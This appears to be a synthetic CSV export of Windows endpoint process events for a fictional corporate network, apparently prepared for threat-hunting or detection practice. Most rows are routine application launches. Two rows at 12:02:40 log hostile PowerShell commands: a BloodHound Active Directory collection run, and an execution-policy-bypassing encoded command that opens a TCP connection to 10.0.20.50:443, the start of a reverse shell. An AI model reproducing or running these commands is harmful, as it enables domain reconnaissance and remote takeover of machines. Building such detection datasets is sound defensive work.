TimeGenerated,Timestamp,DeviceName,DeviceId,AccountName,AccountDomain,FileName,FolderPath,ProcessCommandLine,ProcessId,SHA256,SHA1,MD5,FileSize,InitiatingProcessFileName,InitiatingProcessFolderPath,InitiatingProcessCommandLine,InitiatingProcessId,InitiatingProcessAccountName,InitiatingProcessSHA256,InitiatingProcessSignatureStatus,InitiatingProcessSignerType,ProcessIntegrityLevel,ProcessTokenElevation,Type
2026-04-29T11:48:28Z,2026-04-29T11:48:28Z,LAP-SALES-03,dev-lap-sales-03,mwhite,CORP,msedge.exe,C:\Program Files,msedge.exe,7128,21085aa45a9448a12cefe7fd47906637a7e0a50a0f724668520d83ca134e0adf,61ac996dc4ef0d9e01a356f6b4e702a618b2bafb,b3145d9396effa902414bfca98d82726,504260,services.exe,C:\Windows,C:\Windows\services.exe,9098,mwhite,715a1daad93a66eb078a0c66acf11247d128a733a0236f17a67bd6dbae04e99b,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:48:44Z,2026-04-29T11:48:44Z,SVR-DC-01,dev-svr-dc-01,tnguyen,CORP,SearchHost.exe,C:\Windows\System32,SearchHost.exe,1456,84500930bb87ab8a737dc6e5077ea2b335e786d16d5862e0c152c94250f82569,0535c120556f16ee9618c86a1b2764e16c80f93b,f4c6250f11fc3ec7e831ea907585deff,1140669,svchost.exe,C:\Windows,C:\Windows\svchost.exe,3997,tnguyen,87c08cb26542d8f12652c5bcfdcb13108d54be075c34b47f5bc9a193c01aff13,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:49:54Z,2026-04-29T11:49:54Z,WS-HR-03,dev-ws-hr-03,mwhite,CORP,svchost.exe,C:\Windows\System32,svchost.exe,4562,35ec0160a5d656857328bc576b007a8ca583b5915f6419bcbf3b02b6f6551690,d0b0e5a2902b615df3577cb7a135f4ff6671dad5,4020000e085e1191545d24250340a4f4,1832804,code.exe,C:\Windows,C:\Windows\code.exe,9596,mwhite,269b7a0446f1d5c5c95030ecfdb04b9082e379cbcdfc6f5e3485f5b27dbae008,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:50:18Z,2026-04-29T11:50:18Z,WS-OPS-02,dev-ws-ops-02,bsato,CORP,code.exe,C:\Program Files,code.exe,8574,2c93602607ccf33026bbad2ccd6e75a79758515256b223059e64ce249d6893fa,d538daa0185320a9c159f5bb41e8bc92705c087e,35339f192dc7e6b7a83cb254f2c2ad94,2986296,services.exe,C:\Windows,C:\Windows\services.exe,3845,bsato,591815f55d01405e274b31ff362ff547e801616ed6c84eebcca10d24a24b2f50,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:50:42Z,2026-04-29T11:50:42Z,WS-IT-02,dev-ws-it-02,agarcia,CORP,chrome.exe,C:\Program Files,chrome.exe,5521,015ec47b48623a3605c73dbbd1cfac2b94afaf6f3702bc2552263c43690b8708,5b9e03b0ec4cc801e698ab7cf691fb6b78d02352,7186887d9ec2d8e93ce99a126854bfea,309227,services.exe,C:\Windows,C:\Windows\services.exe,4730,agarcia,083047fb70f4dfa3d65b8cf50f322af116756276ad2031b6972855e38e054c9d,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:51:29Z,2026-04-29T11:51:29Z,WS-FINANCE-01,dev-ws-finance-01,ehernandez,CORP,chrome.exe,C:\Program Files,chrome.exe,8402,aee0a9f1f4d9a87cc73c7222e4505f3e4a7a744a9c0173e5916f4858bb264fbf,0e4f0c47392a11aa506493ac5feb1e5a1109fe4c,ceca5a6a1803876c48a1d955389001b7,3830418,svchost.exe,C:\Windows,C:\Windows\svchost.exe,6014,ehernandez,7a7f6a8499d219a34743f3877d169fc97e0c551099fc706f5cc429a31f8981aa,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:52:07Z,2026-04-29T11:52:07Z,WS-OPS-02,dev-ws-ops-02,mwhite,CORP,OneDrive.exe,C:\Program Files,OneDrive.exe,9061,f53a54cf6611c386e4ca5c877e5e24367edefe4f501270d64eded482dc27fdc1,3bae597f0d45b5070ea475925a13cd073ffb6f1a,7ee0f377bb6038ad278b8422cc2b6511,4123406,explorer.exe,C:\Windows,C:\Windows\explorer.exe,9640,mwhite,d8782239717f4a519e7623bb331b169433b169457fc1bd7754b3a7dacb5f1771,Microsoft,Microsoft,High,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:52:52Z,2026-04-29T11:52:52Z,WS-IT-01,dev-ws-it-01,kpatel,CORP,OneDrive.exe,C:\Program Files,OneDrive.exe,7042,f91e26a05b95ca6ac604a354f7a981671ac988a32b0471b708fafffb3deab073,4132dd13bc2f31cec3902c82a05ba0724cf5e893,6be2d08200e87607918d769b5fa71603,3095291,explorer.exe,C:\Windows,C:\Windows\explorer.exe,3306,kpatel,a7d65972ba1fadb8cc0bc013dd51190ae2c9a2be54af955db9932d8a5a983611,Unsigned,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:54:11Z,2026-04-29T11:54:11Z,WS-MKT-01,dev-ws-mkt-01,sthompson,CORP,chrome.exe,C:\Program Files,chrome.exe,8674,9126852978858fd70923092be29524cc9b0107043010a191cf0feed0e775bd73,bcccfb699d00720d98824cdaef290b968e4d4c10,9761ed8c69b345fef2ef9d9d4a79d28d,2024761,svchost.exe,C:\Windows,C:\Windows\svchost.exe,5022,sthompson,9c6bb07526f513f5e2e27ce8d45fe41edcc2846d83a2de849846f40ceed7a87e,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:54:45Z,2026-04-29T11:54:45Z,SVR-DC-01,dev-svr-dc-01,kpatel,CORP,Teams.exe,C:\Program Files,Teams.exe,8607,9b0941bafc1560be8bf397f20ccec62dcaaaeacb34eb920d93f97a42ce985ce9,949b600ef4f5849dbe49685167d0035655148578,2093ae984bc78520f74e3fdcf8f32556,2277671,svchost.exe,C:\Windows,C:\Windows\svchost.exe,7346,kpatel,66f168d5b56de0315008523d42f65f660ceb1d1c1d4851af01046e6321d4870c,Microsoft,Microsoft,High,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:55:05Z,2026-04-29T11:55:05Z,LAP-EXEC-01,dev-lap-exec-01,jharris,CORP,explorer.exe,C:\Windows\System32,explorer.exe,1065,7f368ea837054f1016b9f0c4ad79548d918537e5799c81ccdfba6d062fca613f,f2b36bd9861660b81bb58e7b0233b3e65ad66851,2220c902349b5d70bf2489e57a0b3518,1736460,explorer.exe,C:\Windows,C:\Windows\explorer.exe,6201,jharris,35b7f7110693083cb661984c8184fe315ba1440b2798c4a876ab140a1eeded11,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:55:10Z,2026-04-29T11:55:10Z,WS-HR-03,dev-ws-hr-03,sthompson,CORP,explorer.exe,C:\Windows\System32,explorer.exe,5219,65be1ec047fc84701bf0653c5584465b5f3656eb4e95e19cb6c9e1111f9c67ce,147911abc3b8bed4cb9dacc3d146d25d1b3a90a9,c0ca695314fade3573bfc3e9ee60a3ac,460878,explorer.exe,C:\Windows,C:\Windows\explorer.exe,9747,sthompson,19f2d4c1582af37d264ac823c8348da39eca65673be564e28c1476296c640787,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:55:13Z,2026-04-29T11:55:13Z,WS-OPS-02,dev-ws-ops-02,bsato,CORP,chrome.exe,C:\Program Files,chrome.exe,5431,cfc71adc8a1cbc6b2b339f16b26873cab444bf1f9feafbcb73e549ddd5ce3455,d6078103a4aa067f6b144661666532b4a9d9a535,3ab0f3c7ec883006ff01ba0785079d40,2611176,explorer.exe,C:\Windows,C:\Windows\explorer.exe,7409,bsato,1aa613af76a20996ab51a8947a34d17707f5b8ec7b29c546e239b61806f60516,Microsoft,Microsoft,High,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:55:47Z,2026-04-29T11:55:47Z,LAP-EXEC-01,dev-lap-exec-01,kpatel,CORP,msedge.exe,C:\Program Files,msedge.exe,7375,1c8ae50716c6bedc9675497c29ca92bdb71d2c320fd03e6816922d675c7495de,afa4c0ac3455c783349398ad09764e9b1e5442b0,bcfd80be3415b9524c338484ba4d13f1,2708313,svchost.exe,C:\Windows,C:\Windows\svchost.exe,5865,kpatel,8c8d5fd920c3f79307e8774b1ecec040c21896735f2787ac4e2820118db73fd2,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:55:56Z,2026-04-29T11:55:56Z,WS-OPS-01,dev-ws-ops-01,tnguyen,CORP,Teams.exe,C:\Program Files,Teams.exe,6157,a0a284d294faddcdc000caf0610bc0c635888d9cba2335f4fdad60cf0ac64168,7968535f63518cc02bbe6ff3888e027949bae6fb,8b62bb63db496728930cb7e4cbcf022b,3785760,OUTLOOK.EXE,C:\Windows,C:\Windows\OUTLOOK.EXE,9694,tnguyen,6a8d7c1404ee2c630b6200c26fe72b98d7170cb3a77a5e809d2659f5e677ea24,Microsoft,Microsoft,Low,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:55:56Z,2026-04-29T11:55:56Z,WS-MKT-02,dev-ws-mkt-02,rmorales,CORP,chrome.exe,C:\Program Files,chrome.exe,2825,3f38892c86ee493347b99535043e0dd4aae6106cc9e1fcda71c4f59ece8353cb,993abc131fd06253787e095510a38268d37582fb,f930897984cdcda04e9a2eae8422bfa5,2901259,services.exe,C:\Windows,C:\Windows\services.exe,7364,rmorales,e654d781b469c0961a9491f47364e89740e3af0121268f8294e0b42d71c91422,Valid,Microsoft,High,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:57:04Z,2026-04-29T11:57:04Z,WS-MKT-02,dev-ws-mkt-02,bsato,CORP,OUTLOOK.EXE,C:\Program Files,OUTLOOK.EXE,7892,19727e9c8b4a9a9bfd1b9270ee0a89c048c642aee43ec998146df92f2649ee3f,e361d26c33d4e84457943f1a5d3de1f0040827af,d9accd0a2f465fbf2bc0e9e13c4a8b2d,4119373,services.exe,C:\Windows,C:\Windows\services.exe,6147,bsato,7a45e7d9afc8b19066ba03b8809627c79b81add435ee4b03175b1393ebded773,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:57:05Z,2026-04-29T11:57:05Z,WS-DEV-02,dev-ws-dev-02,rmorales,CORP,powershell.exe,C:\Windows\System32,powershell.exe,4508,8966b4c3cf65a1056143e0f7cdbbfcfa90c2bcde180e72c1108e4478afad8140,fbba5e9a3516f0fa0aae4165948c105030eb62c3,7dae2089f0ce66be56006d93f03f243e,4360048,explorer.exe,C:\Windows,C:\Windows\explorer.exe,4363,rmorales,776728cec0379d4f502bc946e2d87bde00e48e3748180875b2e2c2ad2f90b361,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:57:24Z,2026-04-29T11:57:24Z,WS-HR-03,dev-ws-hr-03,mwhite,CORP,OUTLOOK.EXE,C:\Program Files,OUTLOOK.EXE,5346,7ca748b65b8d5ca2e511843c11f5b2d6ba751b65793426158273ddf29d5286a3,d11a4503fcaf1e9afac9a99db4c353c1e0714603,1441301a4b2e918483f08decf9007869,3295764,services.exe,C:\Windows,C:\Windows\services.exe,6001,mwhite,8657ab21fa0e8d72807fa35719f13b493f82f094d7d4b11384f51ae40d60b1d3,Valid,Microsoft,System,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:57:49Z,2026-04-29T11:57:49Z,SVR-DC-01,dev-svr-dc-01,sthompson,CORP,svchost.exe,C:\Windows\System32,svchost.exe,3118,8722361cf8c8fcf780411a88c99e578e307df8bee167f9e76e17f31df959c268,0d4e418056204092a28650e0e9e5212cae714035,6129019e03f9902fe4fa23d3466688ea,4695753,svchost.exe,C:\Windows,C:\Windows\svchost.exe,2308,sthompson,f4e5fd005f2829b82008223e5ab35744a60d0942a2ed1c4ca05d961d1ff52dad,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:58:21Z,2026-04-29T11:58:21Z,WS-MKT-02,dev-ws-mkt-02,ehernandez,CORP,SearchHost.exe,C:\Windows\System32,SearchHost.exe,5285,9bee045c85e8527b453c09ffd8134f73c8c2a808b36f344a3186516fbe073279,ebbd640c4b0d2fc836f261eb1d6b7959bd18874e,1c2908cc283c253dc0b8e44b6725e30c,637763,RuntimeBroker.exe,C:\Windows,C:\Windows\RuntimeBroker.exe,913,ehernandez,19e4b80a9f586694c8bb0c773966df77a139e75284b56d0cba770615270129c9,Microsoft,Microsoft,High,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:58:29Z,2026-04-29T11:58:29Z,WS-IT-01,dev-ws-it-01,ehernandez,CORP,explorer.exe,C:\Windows\System32,explorer.exe,4389,4393c02168ab38064fd77730e72e80a9a3346354f6a97e91668549ed0944e386,e10f5b01a970c980d0717441564de06cd4b6d9cb,67bb2e06136dc7f9cfaf722a2a38e134,1511017,svchost.exe,C:\Windows,C:\Windows\svchost.exe,7597,ehernandez,af98f65ebb9806519efd444087a87f0280cff4f3996709ac2c845776b8f7bd6c,Microsoft,Microsoft,Low,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:58:41Z,2026-04-29T11:58:41Z,WS-MKT-01,dev-ws-mkt-01,sthompson,CORP,chrome.exe,C:\Program Files,chrome.exe,2169,5eb3bdc0fce5b7bd18537487c2ad99a2ca2694c9e80ad7b5e9e852a163783f65,2c90453dbb4e3da574e0a2c9f1f6c46f2b81da18,61c9dcd8820e05afff026c0655c8497c,1158471,explorer.exe,C:\Windows,C:\Windows\explorer.exe,3787,sthompson,a953c347da38fc081eae291648043fa4aab1ab3ddef52d5f7c7924317ef3303d,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:59:03Z,2026-04-29T11:59:03Z,LAP-SALES-03,dev-lap-sales-03,olopez,CORP,explorer.exe,C:\Windows\System32,explorer.exe,8938,5ad039c4730c781257a9bcf9db152f0d7e1e54f7ba8023b5ed7d7529b3288617,224963d172e04e7afb758262b73117f490e0e2ea,0564715cc88cfbf0c2de0b003a6306cd,4117603,explorer.exe,C:\Windows,C:\Windows\explorer.exe,7851,olopez,52c1b92658e24e1d3b5fa4551ca1b5baf26c3a73c957105812318d10d60ee0a0,Microsoft,Microsoft,System,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:00:30Z,2026-04-29T12:00:30Z,WS-OPS-02,dev-ws-ops-02,mwhite,CORP,msedge.exe,C:\Program Files,msedge.exe,6693,93131ed307209292105fc984be59dd30c89d6901f3f7c01d311126dfac829363,32408bc804f9a18ac76cb2d6b9391e8cdc3ac158,490e63594d51d9714e4e8261c3cdedeb,906015,explorer.exe,C:\Windows,C:\Windows\explorer.exe,8743,mwhite,721ff74a4387e3415dc6f22e2367a7faef1505edaee394499c81ece502dc1cfd,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:00:33Z,2026-04-29T12:00:33Z,SVR-DC-01,dev-svr-dc-01,ehernandez,CORP,code.exe,C:\Program Files,code.exe,1752,0efb04e5dedeefdc21c5e72bdf0ecc57aa72f0d11d0d3e0e616e5938b3e13080,95337bd13b41758ee28b57207e6b2bd04f4dbc6a,35a95106bf217db132b851f7d3d81a32,3531862,chrome.exe,C:\Windows,C:\Windows\chrome.exe,8326,ehernandez,70c8b5d0029b9632a80d5152c24840b06a5b5a76b41ce1a65f0b1d75a9c915b0,Microsoft,Microsoft,High,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:00:39Z,2026-04-29T12:00:39Z,WS-IT-01,dev-ws-it-01,agarcia,CORP,OUTLOOK.EXE,C:\Program Files,OUTLOOK.EXE,8196,f1a20084a7e35f0e93f0bed459156cb5c21a6a652511226079cb081135d7e3ee,b862e58ecae5cb2331ec00541061df6e736ab311,1df6ab473a3d41db321ee61c3fe85770,4942605,OUTLOOK.EXE,C:\Windows,C:\Windows\OUTLOOK.EXE,8202,agarcia,a21e95bfd3b9a55a79122ac22bcc1b23d77b948b3f8e0a592a0eedaf5fce9fd2,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:01:06Z,2026-04-29T12:01:06Z,WS-FINANCE-01,dev-ws-finance-01,agarcia,CORP,OneDrive.exe,C:\Program Files,OneDrive.exe,1834,306f22e186297b450d75a891326d8f2b89dd7d7d7d486566b2a5647b74b0b098,371de7d359ec30bdbf154c43226316274b5f4884,570d6a769e4be3462dbc0a1e7678bb93,2275305,explorer.exe,C:\Windows,C:\Windows\explorer.exe,8265,agarcia,0dc7d7a09326806ed6cc3a516f2ead414136ab04101ec1e72dd26a957a0e4c5b,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:01:14Z,2026-04-29T12:01:14Z,LAP-EXEC-01,dev-lap-exec-01,jharris,CORP,chrome.exe,C:\Program Files,chrome.exe,3249,268b397551bcdf2a97dffa204b5fbf6929bbef6c05bc808bc67ff04747673795,a29346ca10e9e5732935779144768e89b5266476,9cdf2a8e035a34e387e0e52384e931ce,688176,svchost.exe,C:\Windows,C:\Windows\svchost.exe,8244,jharris,ba9afab8659e577edf5774aa6ecfbe678683ae8445ed99e6143d8a570e31dbd7,Valid,Microsoft,System,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:01:22Z,2026-04-29T12:01:22Z,LAP-EXEC-01,dev-lap-exec-01,kpatel,CORP,OUTLOOK.EXE,C:\Program Files,OUTLOOK.EXE,3387,f61215d1df5d6a8ed112ca76986e73f7d04778413d618e6d638dd185ea98ee99,fef66175c0ff35ea2983a29c8f8ceb243d29e074,c30d1919be6566ed43d68a61dbb625c2,771211,chrome.exe,C:\Windows,C:\Windows\chrome.exe,2493,kpatel,771cbfdf104dede54b20c1cf05da661432e7b88e9996c0de8d01f276b1c5129a,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:01:23Z,2026-04-29T12:01:23Z,LAP-EXEC-01,dev-lap-exec-01,jharris,CORP,code.exe,C:\Program Files,code.exe,6415,c3362862f8e286040a7b9c2c60e8c61f133ebb4e5fcd3004db917bff07029d69,7e152295596a0596f9a0df8544d4a2478364eb2b,23cd44fbea3f36b76b0e44a34f2ce474,2426966,RuntimeBroker.exe,C:\Windows,C:\Windows\RuntimeBroker.exe,9242,jharris,d93b1f4260e5327ee3a47e888522c93e74824aa191ea4fb05064a37f0a2bc26d,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:01:29Z,2026-04-29T12:01:29Z,WS-OPS-02,dev-ws-ops-02,jharris,CORP,SearchHost.exe,C:\Windows\System32,SearchHost.exe,6466,388a5fe4992db3e44d81a8f47b0c42c6062b182f1692a4a9eb8103fb9339f2f6,cbd4033bb9f3eca216e89a5c772d480f635e759b,8c674ccc917836c260d905728fcb7bac,4221265,chrome.exe,C:\Windows,C:\Windows\chrome.exe,1992,jharris,0d4d8ba64208c0628770a254f4f14d7ba06fd882ea141f3c54334d8d70e3b916,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:01:52Z,2026-04-29T12:01:52Z,WS-MKT-02,dev-ws-mkt-02,rmorales,CORP,notepad.exe,C:\Windows\System32,notepad.exe,3901,ff51f112002bf947d887da4659a8c182df34eb9c6dd38d1d7d030f75afb6685e,80ef5081ec0fc0d77d1f052d8e9ff25e8fa8f276,4f44f78914f966e3e077791b727d6585,1793758,services.exe,C:\Windows,C:\Windows\services.exe,7004,rmorales,a00de05feb3b8217afa0fbe8dd0b3bb94bbd201718a58ba4cea9a5be2801fab2,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:02:34Z,2026-04-29T12:02:34Z,LAP-SALES-03,dev-lap-sales-03,agarcia,CORP,Teams.exe,C:\Program Files,Teams.exe,3886,ad3f708012cf512fefcaaff76c85e3dd890b754e98fe3b61da8da8badb8a831d,5e6b0779be11014b6783bf3fe6dcd95661844a05,2f2b799c6d41ad26a6d99bb19abe8f7c,1959938,RuntimeBroker.exe,C:\Windows,C:\Windows\RuntimeBroker.exe,1834,agarcia,1bd885c15f54c8f2adc7b6302dda3768b7c682e8c86cc4e3f559fe6a8c6b72dd,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:02:40Z,2026-04-29T12:02:40Z,LAP-SALES-03,dev-lap-sales-03,olopez,CORP,powershell.exe,C:\Windows\System32,powershell.exe Import-Module .\bloodhound.ps1; Invoke-BloodHound -CollectionMethod All,4321,15457c6fe4d0de56dd2445544f01271443a2f8978d01b976cd7906f7474920f7,7eea077c09b085210a041a7f10c1e28d21ebb925,098ebe7139e2455adafd495bb8374824,524288,powershell.exe,C:\Windows,C:\Windows\powershell.exe,1234,olopez,d3ae1d58e158ed5f671a784071f5244b06d996aa36a46077b2bbf7a119fc46ef,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:02:40Z,2026-04-29T12:02:40Z,WS-IT-01,dev-ws-it-01,jharris,CORP,powershell.exe,C:\Windows\System32,powershell.exe -nop -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADIAMAAuADUAMAAiACwANAA0ADMAKQA=,4321,6d1c7513169ee288e87402bb911bfe0d6d6ee0ac0ec4c4257fae79fb129912cf,eb73062f26b94d132ca04a1d3fce27df80df2e78,45f3c045d06c45f8a6e5f9114a20b8e1,524288,cmd.exe,C:\Windows,C:\Windows\cmd.exe,1234,jharris,fcd1f061cd9070bb33b3b06859fcdacd5139f8f30b491e703b34628387fe2b67,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:02:58Z,2026-04-29T12:02:58Z,WS-MKT-01,dev-ws-mkt-01,ehernandez,CORP,code.exe,C:\Program Files,code.exe,6731,8e4a3f73deabe1c9c01ebb30ab820b976bdaa43b098cd6ebc3d3aaecb3f77432,434241e7d6d23633cc5cd6cbc0f64c4b557a2c7b,5564dc840baaf75e6853272121ddf810,1771213,explorer.exe,C:\Windows,C:\Windows\explorer.exe,6587,ehernandez,77f8e08a6819ce0839638d251bea57aa44fdeda4b719f85fd657a2194a622d5e,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:03:12Z,2026-04-29T12:03:12Z,LAP-EXEC-01,dev-lap-exec-01,sthompson,CORP,msedge.exe,C:\Program Files,msedge.exe,6613,6e181c9596fde22023584772d12b93d0ace98a0db4dc207cb6248b5f6eafadc5,8e31398828cf9b0ca6f2188e7f29f12e8833d582,e92fe55aed43d94064a37e815e718cf5,4321181,svchost.exe,C:\Windows,C:\Windows\svchost.exe,8443,sthompson,4768f1a7a2ce0e33d9a4bf1190d422ef605c9e499f4647d9d5f6a92465ef3548,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:03:29Z,2026-04-29T12:03:29Z,WS-HR-03,dev-ws-hr-03,ehernandez,CORP,Teams.exe,C:\Program Files,Teams.exe,6553,f41abbac2346d284de063f553ab28ed06b019e69b9bbef75b7b1805ffb70f744,540126ae77aa396426702b75502e6693476ae635,cca15bc542d90419cbc13c71d65b3c5c,971836,explorer.exe,C:\Windows,C:\Windows\explorer.exe,1357,ehernandez,3506fa4d9480305cd39110593f5028d06e1c86b2d6238d3566e23102072043a1,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:03:41Z,2026-04-29T12:03:41Z,SVR-WEB-01,dev-svr-web-01,sthompson,CORP,code.exe,C:\Program Files,code.exe,3369,7874ad116b0ac9bd5deb13bd9b1c03e5c17abc55f6c449e7ba471e23caaec402,dada212879cb6680da06f64ef3d1268a5a69b44a,7cf827c51a1139276fbf3061015c0f58,1811273,explorer.exe,C:\Windows,C:\Windows\explorer.exe,3689,sthompson,e37cc76707577c8f2c95765e70105258cdaefa238c0ec99930c8f0e8d94b651d,Unsigned,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:03:51Z,2026-04-29T12:03:51Z,WS-DEV-02,dev-ws-dev-02,tnguyen,CORP,svchost.exe,C:\Windows\System32,svchost.exe,9878,895cb672e67d45c8bf20667c3a2bfe08a03f93326664e8d863f9e89228903b2f,6f331cf7b0af02eada5cf69171d0a2ea46ef5969,47dee92faf38650f51c0fed91fb94f44,1380523,svchost.exe,C:\Windows,C:\Windows\svchost.exe,7173,tnguyen,889b3efd6bf64e5f93c6a694cee8bbaf4ad86aed01719bbc35507e01e4e5072a,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:05:24Z,2026-04-29T12:05:24Z,WS-FINANCE-01,dev-ws-finance-01,jharris,CORP,chrome.exe,C:\Program Files,chrome.exe,6068,e5f59e8b131465976aba1c9d8fd0991b6b7b787368c1e3b488cf5371c2ca1728,26daee0d2839f7e53880c16245e5bd2e64f8515a,8edcfd153768e1b0fb59fa25552b75f1,851869,services.exe,C:\Windows,C:\Windows\services.exe,8929,jharris,8e4927381469f58f8acbadc86ab6dd75608db58e668eec5c38c5563a2c28bdb3,Microsoft,Microsoft,High,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:05:32Z,2026-04-29T12:05:32Z,WS-OPS-01,dev-ws-ops-01,jharris,CORP,msedge.exe,C:\Program Files,msedge.exe,3099,31d535e9a5e2411ffceae2029b41d950849371053382ca62a132e0401ab70cb1,fea07e7ec96bad6f526c5328092d5847772e06bc,956599534c2e6fbcc20dba834f42a7ee,2090375,code.exe,C:\Windows,C:\Windows\code.exe,6071,jharris,20dde63e885607c62e6d0ec209439ce37ccaef39ad10edfc635089834bc5205c,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:06:54Z,2026-04-29T12:06:54Z,WS-MKT-02,dev-ws-mkt-02,kpatel,CORP,powershell.exe,C:\Windows\System32,powershell.exe,5751,2ac33dc3398c56dae48632d6a855ceb15b26b656879ba305d70f2a50c68b7674,e67937e8e1eb92c68075ecfa6295daf1f4d3c616,8710b96a9127e2526c30d8b42db448a2,4457759,explorer.exe,C:\Windows,C:\Windows\explorer.exe,1116,kpatel,c7affccfcb782dfbcf208fbdded150709d5d77d74ec0caae59bafd8dbd10ea9b,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:07:50Z,2026-04-29T12:07:50Z,WS-HR-03,dev-ws-hr-03,sthompson,CORP,powershell.exe,C:\Windows\System32,powershell.exe,3331,52aca2b033fcb4c0b47295c8a40c5b56356851ebfdedfde776310faf51152fb8,e896e3ba5c2c7f9d594f8364a623f89016e63883,a8b3ce8684f8abfa25b718ad31a0139d,245877,explorer.exe,C:\Windows,C:\Windows\explorer.exe,788,sthompson,5f827bdcbb8065633ec121eefa4754b279602fdf95df43b4adfa0fe3192c7666,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
